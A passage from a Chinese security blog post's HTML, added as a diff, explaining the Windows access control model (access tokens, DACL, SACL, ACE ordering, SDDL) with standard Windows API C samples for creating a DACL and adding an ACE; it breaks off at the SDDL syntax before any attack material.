@@ -1,0 +1,1612 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="治愈  之前在济南沙龙上分享的议题，博客记录一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACL攻防漫谈">
+<meta property="og:url" content="https://lengjibo.github.io/ACLNote/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="治愈  之前在济南沙龙上分享的议题，博客记录一下">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/0.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/1.jpeg">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/10.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/11.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/12.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/13.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/14.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/15.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/16.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/17.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/18.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/19.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/20.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/21.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/22.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/23.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/24.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/25.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/26.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/27.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/28.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/29.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/30.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/31.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/32.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/33.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/34.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/35.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/36.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/ACLNote/37.png">
+<meta property="og:updated_time" content="2020-11-27T13:01:55.893Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ACL攻防漫谈">
+<meta name="twitter:description" content="治愈  之前在济南沙龙上分享的议题，博客记录一下">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/ACLNote/0.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/ACLNote/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ACL攻防漫谈 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Accueil</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />A propos</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/ACLNote/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ACL攻防漫谈
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-11-27 20:20:00 / Updated at: 21:01:55" itemprop="dateCreated datePublished" datetime="2020-11-27T20:20:00+08:00">2020-11-27</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>治愈</p>
+<hr>
+<p>之前在济南沙龙上分享的议题，博客记录一下</p>
+<a id="more"></a>
+<h2 id="windows-访问控制模型"><a href="#windows-访问控制模型" class="headerlink" title="windows 访问控制模型"></a>windows 访问控制模型</h2><p>关于windows 访问控制模型</p>
+<p>windows 访问控制模型是由两部分组成。</p>
+<ul>
+<li>访问令牌（Access Token）<ul>
+<li>包含用户的标识(User SID,Group SIDS)，以及特权列表。</li>
+</ul>
+</li>
+<li>安全描述符（security identifiers）。被访问的安全对象的相关安全信息。这里的安全对象包括但不限于<ul>
+<li>NTFS卷上的文件和目录</li>
+<li>注册表项</li>
+<li>网络共享</li>
+<li>服务</li>
+<li>Active Directory对象</li>
+<li>进程等等</li>
+</ul>
+</li>
+</ul>
+<p>安全描述符是与被访问对象关联的，它含有这个对象所有者的SID，以及一个访问控制列表（ACL，Access Control List），访问控制列表又包括了DACL（Discretionary Access Control List）和SACL（System Access Control List）其中，DACL是安全描述符中最重要的，它里面包含零个或多个访问控制项（ACE，Access Control Entry），每个访问控制项的内容描述了允许或拒绝特定账户对这个对象执行特定操作。至于SACL，它很少用到，主要是用于系统审计的，它的内容指定了当特定账户对这个对象执行特定操作时，记录到系统日志中。</p>
+<p><img src="../images/ACLNote/0.png" alt="0.png"></p>
+<ul>
+<li>SIDs：所有用户、组的SID</li>
+<li>DACL (Discretionary Access Control List) 自主访问控制列表</li>
+<li>SACL （System Access Control List） 系统访问控制列表</li>
+<li>ACE （Access Control List）控制项</li>
+</ul>
+<p>在域里面用户的身份上用sid 来表示而不是用用户名来查看，我们可以通过查看用户属性objectsid来查看一个用户的sid。</p>
+<p><img src="../images/ACLNote/1.png" alt="0.png"></p>
+<p>大体的流程是。当对象A来访问B的时候，A会出示自己的Access Token,然后包含自己的用户sid，自己所在的组的sid，以及特权列表。B这个安全对象，有自己的ACL。</p>
+<ul>
+<li>B首先判断是不是需要特权才能访问，如果需要特权，则查看A的Access Token看有没有那个特权。</li>
+<li>B通过A的Access Token，来判断A的用户 sid以及组sids，跟自己的ACL做比对，来判断是否让A进行访问。</li>
+</ul>
+<h3 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h3><p>ACL主要有两个作用</p>
+<pre><code>- 权限访问控制（DACL）
+    - 一个用户能不能访问安全对象
+- 日志记录功能（SACL）
+    - 访问成功与否
+</code></pre><p><img src="../images/ACLNote/2.png" alt="0.png"></p>
+<h4 id="DACL"><a href="#DACL" class="headerlink" title="DACL"></a>DACL</h4><p>DACL起到的作用是权限访问控制，也就是判断一个用户能不能访问安全对象。DACL 由若干条ACE构成。</p>
+<p><img src="../images/ACLNote/3.png" alt="0.png"></p>
+<p>那DACL 是怎么判断用户能否访问呢。</p>
+<p>所有的可访问对象都有三种ACE，分别是Access-denied ACE，Access-allowed ACE，System-audit ACE。Access-denied ACE用于拒绝账户访问，Access-allowed ACE用于允许账户访问，而System-audit ACE用于SACL中。</p>
+<p>当一个线程尝试去访问一个对象时，系统会检查线程持有的令牌以及被访问对象的安全描述符中的DACL。如果安全描述符中不存在DACL，则系统会允许线程进行访问。</p>
+<p>如果存在DACL，系统会顺序遍历DACL中的每个ACE，检查ACE中的SID在线程的令牌中是否存在。当满足以下条件时，遍历会终止：</p>
+<p>某个Access-denied ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统拒绝该线程访问对象。<br>某个Access-allowed ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统允许线程访问对象。<br>所有ACE中的SID在线程令牌中均不存在，此时系统拒绝线程访问对象。</p>
+<p>举个例子</p>
+<p><img src="../images/ACLNote/1.jpeg" alt="0.png"></p>
+<p>Object对象的DACL中含有三个ACE，第一个ACE拒绝Andrew账户对Object进行读取，写入和执行操作；第二个ACE允许Group A账户组中的所有账户对Object进行写入操作；第三个ACE允许任何账户对Object进行读取和执行操作。</p>
+<p>线程A试图访问Object，在遍历DACL的时候，遇到第一个ACE，满足上述的条件，遍历终止，线程A被拒绝访问Object，尽管线程A的访问令牌中含有Group A账户组的SID，并满足第二个ACE。同理，第三个ACE也没有被检查。对于线程B的分析是一样的，这里就不啰嗦了。可见ACE的排列顺序对线程能否访问对象是很重要的。</p>
+<p>创建DACL的方法：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WIN32_WINNT 0x0500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sddl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"advapi32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateMyDACL</span><span class="params">(SECURITY_ATTRIBUTES *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     SECURITY_ATTRIBUTES  sa;</span><br><span class="line">      </span><br><span class="line">     sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">     sa.bInheritHandle = FALSE;  </span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!CreateMyDACL(&amp;sa))</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">// Error encountered; generate message and exit.</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Failed CreateMyDACL\n"</span>);</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (<span class="number">0</span> == CreateDirectory(TEXT(<span class="string">"C:\\MyFolder"</span>), &amp;sa))</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">// Error encountered; generate message and exit.</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Failed CreateDirectory\n"</span>);</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// Free the memory allocated for the SECURITY_DESCRIPTOR.</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="literal">NULL</span> != LocalFree(sa.lpSecurityDescriptor))</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">// Error encountered; generate message and exit.</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Failed LocalFree\n"</span>);</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateMyDACL</span><span class="params">(SECURITY_ATTRIBUTES * pSA)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">     TCHAR * szSD = TEXT(<span class="string">"D:"</span>)       <span class="comment">// Discretionary ACL</span></span><br><span class="line">        TEXT(<span class="string">"(D;OICI;GA;;;BG)"</span>)     <span class="comment">// Deny access to </span></span><br><span class="line">                                     <span class="comment">// built-in guests</span></span><br><span class="line">        TEXT(<span class="string">"(D;OICI;GA;;;AN)"</span>)     <span class="comment">// Deny access to </span></span><br><span class="line">                                     <span class="comment">// anonymous logon</span></span><br><span class="line">        TEXT(<span class="string">"(A;OICI;GRGWGX;;;AU)"</span>) <span class="comment">// Allow </span></span><br><span class="line">                                     <span class="comment">// read/write/execute </span></span><br><span class="line">                                     <span class="comment">// to authenticated </span></span><br><span class="line">                                     <span class="comment">// users</span></span><br><span class="line">        TEXT(<span class="string">"(A;OICI;GA;;;BA)"</span>);    <span class="comment">// Allow full control </span></span><br><span class="line">                                     <span class="comment">// to administrators</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pSA)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> ConvertStringSecurityDescriptorToSecurityDescriptor(</span><br><span class="line">                szSD,</span><br><span class="line">                SDDL_REVISION_1,</span><br><span class="line">                &amp;(pSA-&gt;lpSecurityDescriptor),</span><br><span class="line">                <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="ACE"><a href="#ACE" class="headerlink" title="ACE"></a>ACE</h4><p>通俗点来理解就是ace用来标识具体的权限，大体为下面四个方面</p>
+<ul>
+<li>谁对你有权限</li>
+<li>是允许还是拒绝</li>
+<li>有什么权限</li>
+<li>这个权限能不能被继承</li>
+</ul>
+<p>可以使用下面的方法修改ace：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">AddAceToObjectsSecurityDescriptor</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPTSTR pszObjName,          <span class="comment">// name of object</span></span></span></span><br><span class="line"><span class="function"><span class="params">    SE_OBJECT_TYPE ObjectType,  <span class="comment">// type of object</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPTSTR pszTrustee,          <span class="comment">// trustee for new ACE</span></span></span></span><br><span class="line"><span class="function"><span class="params">    TRUSTEE_FORM TrusteeForm,   <span class="comment">// format of trustee structure</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwAccessRights,       <span class="comment">// access mask for new ACE</span></span></span></span><br><span class="line"><span class="function"><span class="params">    ACCESS_MODE AccessMode,     <span class="comment">// type of ACE</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwInheritance         <span class="comment">// inheritance flags for new ACE</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwRes = <span class="number">0</span>;</span><br><span class="line">    PACL pOldDACL = <span class="literal">NULL</span>, pNewDACL = <span class="literal">NULL</span>;</span><br><span class="line">    PSECURITY_DESCRIPTOR pSD = <span class="literal">NULL</span>;</span><br><span class="line">    EXPLICIT_ACCESS ea;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pszObjName) </span><br><span class="line">        <span class="keyword">return</span> ERROR_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get a pointer to the existing DACL.</span></span><br><span class="line"></span><br><span class="line">    dwRes = GetNamedSecurityInfo(pszObjName, ObjectType, </span><br><span class="line">          DACL_SECURITY_INFORMATION,</span><br><span class="line">          <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;pOldDACL, <span class="literal">NULL</span>, &amp;pSD);</span><br><span class="line">    <span class="keyword">if</span> (ERROR_SUCCESS != dwRes) &#123;</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">"GetNamedSecurityInfo Error %u\n"</span>, dwRes );</span><br><span class="line">        <span class="keyword">goto</span> Cleanup; </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize an EXPLICIT_ACCESS structure for the new ACE. </span></span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;ea, <span class="keyword">sizeof</span>(EXPLICIT_ACCESS));</span><br><span class="line">    ea.grfAccessPermissions = dwAccessRights;</span><br><span class="line">    ea.grfAccessMode = AccessMode;</span><br><span class="line">    ea.grfInheritance= dwInheritance;</span><br><span class="line">    ea.Trustee.TrusteeForm = TrusteeForm;</span><br><span class="line">    ea.Trustee.ptstrName = pszTrustee;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a new ACL that merges the new ACE</span></span><br><span class="line">    <span class="comment">// into the existing DACL.</span></span><br><span class="line"></span><br><span class="line">    dwRes = SetEntriesInAcl(<span class="number">1</span>, &amp;ea, pOldDACL, &amp;pNewDACL);</span><br><span class="line">    <span class="keyword">if</span> (ERROR_SUCCESS != dwRes)  &#123;</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">"SetEntriesInAcl Error %u\n"</span>, dwRes );</span><br><span class="line">        <span class="keyword">goto</span> Cleanup; </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Attach the new ACL as the object's DACL.</span></span><br><span class="line"></span><br><span class="line">    dwRes = SetNamedSecurityInfo(pszObjName, ObjectType, </span><br><span class="line">          DACL_SECURITY_INFORMATION,</span><br><span class="line">          <span class="literal">NULL</span>, <span class="literal">NULL</span>, pNewDACL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (ERROR_SUCCESS != dwRes)  &#123;</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">"SetNamedSecurityInfo Error %u\n"</span>, dwRes );</span><br><span class="line">        <span class="keyword">goto</span> Cleanup; </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    Cleanup:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(pSD != <span class="literal">NULL</span>) </span><br><span class="line">            LocalFree((HLOCAL) pSD); </span><br><span class="line">        <span class="keyword">if</span>(pNewDACL != <span class="literal">NULL</span>) </span><br><span class="line">            LocalFree((HLOCAL) pNewDACL); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dwRes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="SACL"><a href="#SACL" class="headerlink" title="SACL"></a>SACL</h4><p>SACL的作用是记录访问成功与否，SACL也是由一条一条的ACE构成，每条ACE的内容是某个用户访问成功/失败 某个权限。当访问跟满足这条ACE的时候就会被记录下来。</p>
+<p><img src="../images/ACLNote/4.png" alt="0.png"></p>
+<h4 id="SDDL"><a href="#SDDL" class="headerlink" title="SDDL"></a>SDDL</h4><p>安全描述符定义语言，定义了ConvertSecurityDescriptorToStringSecurityDescriptor和ConvertStringSecurityDescriptorToSecurityDescriptor函数来进行文本与安全描述符之间的转换。</p>
+<p><img src="../images/ACLNote/5.png" alt="0.png"></p>
+<p><img src="../images/ACLNote/6.png" alt="0.png"></p>
+<p>最下面的那一串便是sddl。</p>
+<p>其语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)</span><br></pre></td></tr></table></figure>
